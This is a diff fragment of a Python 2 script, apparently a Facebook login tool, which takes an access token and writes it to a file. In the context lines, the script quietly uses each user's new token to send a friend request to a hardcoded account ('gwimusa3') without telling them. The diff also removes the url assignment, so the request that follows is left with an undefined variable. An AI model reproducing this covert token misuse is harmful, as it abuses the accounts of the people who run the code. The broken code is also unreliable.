@@ -209,14 +209,12 @@ def login():
 				x.update(sig)
 				a=x.hexdigest()
 				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92m Login Successful...'
-				os.system('xdg-open https://chat.whatsapp.com/DaEl6GBC2ZK18IuI51chaL') #Whatsapp Group Invite
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
